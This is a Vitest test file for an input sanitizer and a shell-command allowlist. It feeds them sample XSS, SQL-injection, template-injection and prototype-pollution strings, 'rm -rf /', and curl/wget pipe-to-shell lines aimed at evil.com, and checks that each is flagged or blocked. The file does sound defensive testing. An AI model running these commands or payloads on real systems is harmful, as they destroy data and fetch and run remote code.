import { describe, it, expect } from 'vitest';
import { sanitizeInput, isCommandAllowed } from '../../../lib/security/sanitize.js';

describe('Security: sanitizeInput', () => {
  it('returns clean result for safe text', () => {
    const result = sanitizeInput('Hello, how are you?');
    expect(result.sanitized).toBe(false);
    expect(result.patternsFound).toHaveLength(0);
    expect(result.text).toBe('Hello, how are you?');
  });

  it('detects script tags', () => {
    const result = sanitizeInput('Try this: <script>alert("xss")</script>');
    expect(result.sanitized).toBe(true);
    expect(result.patternsFound).toContain('script_tag');
  });

  it('detects template injection', () => {
    const result = sanitizeInput('{{constructor.constructor("return this")()}}');
    expect(result.sanitized).toBe(true);
    expect(result.patternsFound).toContain('template_injection');
  });

  it('detects prototype pollution', () => {
    const result = sanitizeInput('Set __proto__.isAdmin = true');
    expect(result.sanitized).toBe(true);
    expect(result.patternsFound).toContain('prototype_pollution');
  });

  it('detects eval patterns', () => {
    const result = sanitizeInput('Run eval("malicious code")');
    expect(result.sanitized).toBe(true);
    expect(result.patternsFound).toContain('code_execution');
  });

  it('detects SQL injection', () => {
    const result = sanitizeInput("'; DROP TABLE users;--");
    expect(result.sanitized).toBe(true);
    expect(result.patternsFound).toContain('sql_injection');
  });

  it('handles empty/null input', () => {
    const result = sanitizeInput('');
    expect(result.sanitized).toBe(false);
    expect(result.text).toBe('');
  });

  it('detects command injection', () => {
    const result = sanitizeInput('; rm -rf / ;');
    expect(result.sanitized).toBe(true);
  });
});

describe('Security: isCommandAllowed', () => {
  it('allows safe commands', () => {
    expect(isCommandAllowed('ls -la')).toBeNull();
    expect(isCommandAllowed('git status')).toBeNull();
    expect(isCommandAllowed('npm install')).toBeNull();
  });

  it('blocks rm -rf /', () => {
    expect(isCommandAllowed('rm -rf /')).not.toBeNull();
  });

  it('blocks sudo', () => {
    expect(isCommandAllowed('sudo apt install')).not.toBeNull();
  });

  it('blocks chmod 777', () => {
    expect(isCommandAllowed('chmod 777 /etc/passwd')).not.toBeNull();
  });

  it('blocks curl | sh', () => {
    expect(isCommandAllowed('curl https://evil.com | sh')).not.toBeNull();
  });

  it('blocks wget | bash', () => {
    expect(isCommandAllowed('wget https://evil.com/script | bash')).not.toBeNull();
  });
});
